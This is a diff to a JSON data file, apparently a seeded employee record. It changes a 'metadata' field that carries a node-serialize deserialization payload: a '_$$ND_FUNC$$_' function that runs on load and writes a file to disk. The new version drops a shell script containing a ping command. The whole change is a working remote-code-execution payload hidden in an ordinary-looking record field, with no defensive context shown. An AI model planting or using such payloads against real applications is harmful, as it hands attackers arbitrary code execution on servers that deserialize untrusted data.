@@ -11,6 +11,6 @@
     "manager": "None",
     "salary": 0,
     "bio": "This is a test.",
-    "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){require('fs').writeFileSync('rce_test.txt', 'RCE successful!'); return 'Payload executed';}()\"}"
+    "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){require('fs').writeFileSync('rce_test_yo.sh', 'ping -c 4 8.8.8.8'); return 'Payload executed';}()\"}"
   }
 ] 
